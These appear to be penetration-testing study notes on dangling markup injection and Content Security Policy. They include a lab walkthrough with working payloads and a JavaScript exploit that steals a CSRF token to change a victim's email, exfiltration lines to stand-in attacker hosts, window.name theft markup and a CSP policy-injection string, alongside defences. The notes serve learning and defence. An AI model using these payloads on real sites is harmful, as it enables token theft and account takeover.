# 1. Dangling Markup Injection

## What is dangling markup injection?

Dangling markup injection is a way to steal data across domains when a *full* XSS attack isn't possible (e.g. it's blocked by input filters or a Content Security Policy).

**The setup:** imagine an app puts attacker-controlled input straight into a page without properly escaping it:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

If the app doesn't filter out `>` or `"`, an attacker can break out of the attribute and the tag:

```html
">
```

Normally, an attacker would try to escalate this into full XSS. But if that's blocked, they can instead leave a tag "dangling" — deliberately unfinished:

```html
"><img src='//attacker-website.com?
```

Here's the trick: this opens an `<img>` tag with a `src` attribute pointing to the attacker's server — but never closes the quote. The browser doesn't know that, though. It just keeps reading forward through the page, treating *everything* it finds until the next `'` character as part of that URL. So all the surrounding page content — sensitive data, tokens, whatever comes next — gets swept up into the URL and sent off to the attacker's server. Any special characters like newlines get automatically URL-encoded along the way.

The result: an attacker can capture a chunk of the page's response after their injection point — potentially including things like CSRF tokens, private messages, or financial info. This works with any HTML attribute that causes an external request, not just `img src`.

## Example lab: bypassing a strict CSP with dangling markup

Some labs make this harder by using a CSP that blocks the page from loading any external resources — so a plain `<img src=attacker.com>` trick won't even fire. Here's a simplified walk-through of one such attack, which instead **hijacks a form** so the victim submits their own CSRF token to the attacker.

**Goal:** trick a logged-in victim into unknowingly sending their CSRF token to the attacker, then use that token to change their email.

**Step-by-step:**

1. **Find the injection point.** Trying an obvious XSS payload like `` `<img src onerror=alert(1)>` `` gets blocked by client-side validation on the email field.

2. **Bypass the client-side check.** Using browser DevTools, the input type can be switched from `email` to `text`, revealing the real HTML — including a hidden CSRF token field powering the email-change form.

3. **Sneak the payload past validation** by disguising it as a "valid" email:
   ```
   foo@example.com"><img src= onerror=alert(1)>
   ```
   It gets reflected back on the page, but properly escaped — so no script runs. This tells us the server does sanitize input, and CSP is likely also in play.

4. **Confirm CSP is blocking things** by trying the payload via a URL parameter instead:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
   ```
   It's reflected, but doesn't run — and the browser console shows a CSP violation message confirming the block.

5. **Look for a CSP gap.** Many CSPs forget to restrict `form-action`, which controls where forms are allowed to submit to. This becomes the way in.

6. **Inject a fake button** using the email parameter, pointing its `formaction` at an attacker-controlled server:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-server.net/exploit">Click me</button>
   ```
   Clicking it hijacks the real form and submits it to the attacker's server instead — proving the CSP's `form-action` gap is exploitable.

7. **Grab the CSRF token.** Since the form normally submits via `POST`, the token isn't visible in the URL. Adding `formmethod="get"` forces the hijacked submission to use `GET` instead — which puts the CSRF token right in the URL, where the attacker's server can see it:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-server.net/exploit" formmethod="get">Click me</button>
   ```

8. **Automate the full attack.** The final exploit script does two things depending on the situation:
   - If a CSRF token is already present in the URL (captured from the previous step), it silently builds and submits a hidden form to change the victim's email to `hacker@evil-user.net`, using that stolen token.
   - If no token is present yet, it redirects the victim to the crafted URL containing the malicious button — setting up the token theft.

   ```javascript
   const academyFrontend = "https://your-lab-url.net/";
   const exploitServer = "https://your-exploit-server.net/exploit";

   const url = new URL(location);
   const csrf = url.searchParams.get('csrf');

   if (csrf) {
       // Token captured — silently submit the email-change form using it
       const form = document.createElement('form');
       const email = document.createElement('input');
       const token = document.createElement('input');

       token.name = 'csrf';
       token.value = csrf;

       email.name = 'email';
       email.value = 'hacker@evil-user.net';

       form.method = 'post';
       form.action = `${academyFrontend}my-account/change-email`;
       form.append(email);
       form.append(token);
       document.documentElement.append(form);
       form.submit();

   } else {
       // No token yet — redirect to the page with the hijacked button to steal it
       location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
   }
   ```

9. Deliver this to the victim. Once they interact with the page (per the lab, the click needs to be induced with wording like "Click me"), their email silently gets changed to the attacker's address — all without a single script ever executing, since the CSP never actually got broken.

## How to prevent dangling markup attacks

- **Same defenses as XSS:** properly encode data before it goes into a response, and validate/sanitize input as it comes in.
- **Use CSP as a backstop** — a policy that blocks tags like `<img>` from loading external resources can stop *some* dangling markup attacks (though not all, as the form-hijacking example shows).
- **Browser-level mitigation:** Chrome now blocks `<img>` (and similar tags) from including raw special characters — like angle brackets or newlines — inside URLs. Since dangling markup attacks rely on capturing exactly that kind of raw content, this closes off a lot of these attacks by default.

# 2. Content security policy

## 2.1 - What is CSP

CSP is a security feature built into web browsers. Its main job is to stop attackers from injecting malicious scripts into a webpage (a common attack called XSS) and to prevent other risky behavior.

It works by letting a website tell the browser exactly what's allowed to load on the page — like which scripts, images, or fonts are trusted — and whether other websites are allowed to embed that page inside a frame.

To turn CSP on, the website's server adds a special line to its response called the `Content-Security-Policy` header. This header contains the actual rules (called "directives"), and if there's more than one rule, they're separated by semicolons.

**Basic example:**

```
Content-Security-Policy: script-src 'self'; img-src 'self' https://images.example.com
```

This says:
- `script-src 'self'` → only load scripts from the website's own domain
- `img-src 'self' https://images.example.com` → only load images from the site itself or from `images.example.com`

If an attacker tries to sneak in a script from a random domain, the browser blocks it.

---

## 2.2 - Using CSP to stop XSS attacks

You can restrict *where* scripts are allowed to come from. The following directive will only allow scripts to be loaded from the [same origin](https://github.com/inferLeo-Sshooter/Personal-Penetration-Testing-Reference-Overhaul/blob/main/22.%20CORS/22.1%20-%20CORS%20basic.md#12---same-origin-policy) as the page itself:

```
script-src 'self'
```
→ only allows scripts from the page's own domain (same origin).

```
script-src https://scripts.normal-website.com
```
→ only allows scripts from one specific trusted domain.

⚠️ **Be careful with external domains.** If an attacker can somehow control content on that trusted external domain, they can still sneak in malicious scripts. For example, shared CDNs like `ajax.googleapis.com` (where many different customers can upload files) shouldn't be blindly trusted, since a third party might be able to plant harmful content there too.

**Two more precise ways to trust scripts: nonces and hashes**

- **Nonce** — a random, one-time secret value. The CSP header includes the nonce, and the `<script>` tag must include the *same* value to be allowed to run.
```
Content-Security-Policy: script-src 'nonce-r4nd0m123'
```
```html
<script nonce="r4nd0m123">...</script>
```
  If the values don't match, the script is blocked. This only works if the nonce is generated securely and randomly every time the page loads — otherwise an attacker could guess it.

- **Hash** — a fingerprint of the script's exact content. If the script's contents match the hash listed in the policy, it's allowed to run.
```
Content-Security-Policy: script-src 'sha256-abc123...'
```
  If you ever edit the script, its hash changes — so you'd need to update the CSP value too.

---

**CSP isn't foolproof**

- CSPs often block `script` sources tightly, but are more relaxed about `img` (image) sources. Attackers can exploit this: even without running a script, they can use an `<img>` tag to quietly send stolen data (like a CSRF token) to an external server.
```html
<img src="https://attacker.com/steal?token=SECRET_CSRF_TOKEN">
```

- Some browsers (like Chrome) have built-in protections that block requests containing suspicious raw characters, such as unencoded newlines or angle brackets (`<`, `>`), which helps catch some of these tricks.

- Even very strict policies that block *all* external requests aren't completely safe. Attackers can sometimes get around this by tricking a real user into interacting with the page (e.g., clicking something) — this can trigger an injected HTML element to capture and send data to an external server, bypassing the policy entirely.

## 2.3 - Evading CSP with DOM-based dangling markup

**How the basic trick works**

Imagine the attacker can inject some HTML into a page that already has secret data in it, like this:

```html
INJECTION HERE <b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>
```

The attacker injects an `<img>` tag with an *unfinished* `src` attribute — no closing quote:

```html
<img src="https://evilserver/?
```

Because the quote is never closed, the browser keeps reading everything after it as part of that URL — until it finally hits the *next* quote mark somewhere later in the page. So the browser ends up requesting something like:

```html
<img src="https://evilserver/?<b>test</b><script>token = 'supersecret';</script><form action="blah"></form>">
```

That whole chunk — including the secret `token` — gets sent to the attacker's server as part of the image request. No JavaScript needed.

---

**Getting around strict CSP with the `<base>` tag**

A tight CSP like:

```
default-src 'none'; base-uri 'none';
```

...normally blocks that image trick, since no external resources (images, scripts, etc.) are allowed to load at all.

But the researcher found a workaround using the `<base>` tag's `target` attribute. The `target` attribute controls where links open, and it can also be used to set the browser's internal "window name." By injecting an unfinished `target="` attribute, everything after it (up to the next quote) gets stuffed into the window name instead of being blocked by CSP.

```html
<a href="http://attacker-subdomain/steal.html">Click me</a><base target="
```

Since the quote is left open, all the following page markup (including secrets) gets absorbed into that `target` value — and thus into the window's name.

If the victim clicks the link, it opens the attacker's page in that same window. The attacker's page can then simply read `window.name` to retrieve the stolen data:

```html
<script>alert("Stolen data: " + name);</script>
```

So the attack needs one click from the victim, but doesn't need to defeat CSP directly — it just piggybacks on a built-in browser feature CSP doesn't cover.

---

**How to defend against the `<base>` tag trick**

Add your own legitimate `<base>` tag *before* any place where user input could be injected:

```html
<base target="_self" />
```

Since only the *first* `<base>` tag on a page counts, this stops an attacker's injected `<base>` tag from overriding it.

---

### DOM-based dangling markup without the base tag

**An even sneakier version — no `<base>` tag required**

A way to pull off the same attack *without* using `<base>` at all (so the mitigation above doesn't help). Instead, the attacker injects a hidden form field tied to a form (via the `form=` attribute) plus a clickable button. When the victim clicks the button:

1. The form submits, capturing the dangling markup into the window name (same idea as before).
2. The victim then has to click a second link to actually send that stolen window name off to the attacker.

So it needs **two clicks** instead of one, but it still works even against pages that have the `<base>` tag defense in place. Here's the break down:

**The building blocks**

The attacker injects three pieces of HTML that don't look like a complete, self-contained block — they rely on HTML's flexible `form=` attribute, which lets an input or button "belong" to a form defined *elsewhere* on the page, even if it's not physically nested inside that form's tags.

Roughly, the injected markup looks like this (simplified):

```html
<input type="hidden" name="x" form="x" value="<a href=http://attacker.com/name.html>You must click me</a>">
<button form="x">Click me</button>
<form id="x" target="blah
```

Notice the last part: the `<form id="x" target="blah` is left with an **unclosed quote** on `target`. Just like the earlier `<base target="` trick, everything on the page *after* that point gets swallowed into the `target` attribute's value — right up until the browser finally hits a real closing quote further down the page (which might be inside the site's own legitimate HTML, potentially containing secret tokens or other sensitive data).

**Why a hidden input + button instead of just a link?**

CSP and browser auditors are good at spotting and blocking obvious injected `<a>` tags or scripts pointing to external domains directly. But here, nothing points externally at the moment of injection — it's just a form, a hidden field, and a button, all pointing to elements *within the same page*. That's what lets it slip past CSP and things like Chrome's old XSS Auditor.

**Walking through the two clicks**

1. **First click — "Click me" button:** This submits the form (`id="x"`). Because the form's `target` attribute got hijacked with all that trailing page markup, submitting the form causes the browser to open (or reuse) a window whose **`window.name`** now contains everything between the injection point and the next quote mark — including any sensitive data sitting in that stretch of HTML.

2. **Second click — the hidden link:** The hidden `<input>`'s `value` attribute actually contained a *fake link* (`<a href="http://attacker.com/name.html">You must click me</a>`). Because that value got inserted into the page as raw HTML (not just text), the browser renders it as a real, clickable link. When the victim clicks this link, their browser navigates to the attacker's page — but crucially, it navigates in the *same window* whose `name` property was just set in step 1.

**The payoff**

Once the victim's browser is on the attacker's domain, in that same window, the attacker's page just needs a single line of JavaScript to read out what was stored:

```html
<script>alert("Stolen: " + window.name);</script>
```

Since `window.name` persists across navigations to different origins (that's actually a legitimate, if peculiar, browser feature — not a bug), the attacker's separate domain can freely read the value that was captured from the *victim's* original page, all without ever running a single line of injected JavaScript on the vulnerable site itself.

**Why the earlier fix doesn't help**

The mitigation of adding your own `<base target="_self" />` only protects against attackers hijacking the *page-wide link target* via a rogue `<base>` tag. This new technique never touches `<base>` at all — it hijacks a `<form>`'s own `target` attribute instead, which is a completely separate mechanism. So that specific defense has no effect here; stopping this requires properly encoding/escaping any user-controlled input before it's inserted into the page, so injected quotes and tags can never become live HTML in the first place.

---

**Key takeaway:** CSP mostly stops *scripts* from running, but it can't stop clever abuse of ordinary HTML parsing behavior (unclosed attributes) combined with built-in browser features. Defending against this requires more than CSP — proper output encoding/escaping of user input is what actually prevents the injection in the first place.

## 2.4 - Mitigating dangling markup attacks using CSP

The following directive will only allow images to be loaded from the same origin as the page itself:
```
img-src 'self'
```
The following directive will only allow images to be loaded from a specific domain:
```
img-src https://images.normal-website.com
```
Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an `img` tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling `href` attribute.

## 2.5 - Bypassing CSP with Policy Injection

### The basic idea

Some websites build their CSP header dynamically — meaning part of the policy text comes from something in the request, like a URL parameter. This is often done in the `report-uri` directive, which tells the browser where to send a report if the CSP is violated.

If a site takes a value straight from a URL parameter and drops it into the policy without cleaning it up, you may be able to **inject your own text into the CSP itself** by sneaking in a semicolon (`;`) — since semicolons are what separate one CSP directive from the next.

Because `report-uri` is usually the *last* directive listed, anything you inject gets added to the *end* of the policy. That means you can't simply add a brand-new directive — you need to somehow **override an existing one** to actually weaken the policy.

---

### Real-world example: PayPal

A researcher found that PayPal inserted a `token` URL parameter directly into the `report-uri` directive of its CSP header. For example, visiting:

```
https://www.paypal.com/webapps/xoonboarding?values=etc&token=SOMETOKEN;_
```

...caused the server to generate a CSP header like this:

```
Content-Security-Policy: default-src 'self' https://*.paypal.com ...; report-uri /webapps/xoonboarding/api/log/csp?token=SOMETOKEN;_
```

Notice the `token` value became part of the policy text itself, semicolon and all.

**Why this mattered in Microsoft Edge:**

Most browsers are forgiving — if part of a CSP is malformed or unrecognized, they just skip that piece and keep enforcing the rest. But **Edge behaved differently**: if it hit *any* invalid syntax anywhere in the policy, it would throw out the **entire policy**, leaving the page with no CSP protection at all.

By fuzzing (testing lots of odd inputs), the researcher discovered that just adding a semicolon and an underscore — `;_` — was enough invalid syntax to break Edge's parser and disable the whole CSP:

```
token=SOMETOKEN;_
```

**Why this mattered in Chrome:**

Chrome doesn't fall apart the same way — it simply ignores directives it doesn't understand. So the attacker needed a different approach: instead of breaking the whole policy, **overwrite one specific directive**.

This is where a newer CSP directive called `script-src-elem` comes in.

---

### What is `script-src-elem`?

Normally, the `script-src` directive controls both:
- `<script>` **elements** (actual script tags/files), and
- inline **event handler** attributes like `onclick="..."`.

`script-src-elem` is a more specific directive that controls *only* `<script>` elements, leaving event handlers to a separate directive (`script-src-attr`). For example:

```
Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'
```

```html
<script>alert("This will be blocked")</script>
<a href="#" onclick="alert('This will be allowed')">test</a>
```

Here, the `<script>` tag is blocked, but the `onclick` handler still runs.

#### The key discovery

Crucially, if a policy already has a `script-src` directive, adding a **later** `script-src-elem` directive **overrides it** for script elements. Browsers apply the more specific, later-appearing directive.

So, if an attacker can inject a new directive at the end of the policy (via the same parameter-injection trick as before), they can add:

```
;script-src-elem *
```

This tells the browser: "ignore whatever `script-src` said — for script elements, anything (`*`) is now allowed." That completely defeats the original protection, letting the attacker load a malicious script from anywhere:

```html
<script src="http://subdomain1.portswigger-labs.net/xss/xss.js"></script>
```

---

### The takeaway

This bypass works whenever:
1. A site reflects attacker-controlled input into its CSP header (usually via `report-uri`), **and**
2. The attacker can inject a semicolon to start a new directive.

Depending on the browser, this can either:
- **Break the entire policy** (like the old Edge behavior), or
- **Override just the script directive** using `script-src-elem`, quietly reopening the door to script injection even though the original `script-src` looked airtight.

## 2.6 - Protecting against clickjacking using CSP

Clickjacking is when an attacker hides your website inside an invisible frame on their own page, tricking users into clicking things they didn't mean to. CSP has a directive that stops this: `frame-ancestors`.

**Only allow your own site to frame itself:**

```
Content-Security-Policy: frame-ancestors 'self'
```

This means only pages on the *same* domain can embed your page in an iframe. If `evil-site.com` tries to frame your page, the browser blocks it.

**Block framing completely:**

```
Content-Security-Policy: frame-ancestors 'none'
```

This means *no one* — not even your own site — can put this page inside a frame.

**Why `frame-ancestors` is better than the older `X-Frame-Options` header**

`X-Frame-Options` was the old-school way to block clickjacking, but it's limited: it can only say "same origin" or "deny," and it only checks the *top-level* page doing the framing.

`frame-ancestors` is more flexible in two ways:

1. **You can allow multiple specific domains, including wildcards:**
```
Content-Security-Policy: frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```
This allows framing by your own site, `normal-website.com`, *and* any subdomain of `robust-website.com` (like `shop.robust-website.com` or `blog.robust-website.com`).

2. **It checks the whole chain of frames, not just the outermost one.** If your page is framed inside Page A, which is itself framed inside Page B, `X-Frame-Options` would only check Page B (the outermost page). CSP's `frame-ancestors` checks *every* level — Page A and Page B — so a sneaky attacker can't hide behind a "trusted" outer frame while using an untrusted one in between.

**Best practice**

It's recommended to use `frame-ancestors` for clickjacking protection. Since older browsers like Internet Explorer don't understand CSP, it's a good idea to also include the `X-Frame-Options` header alongside it, so those browsers still get *some* protection even if they can't read the CSP directive.
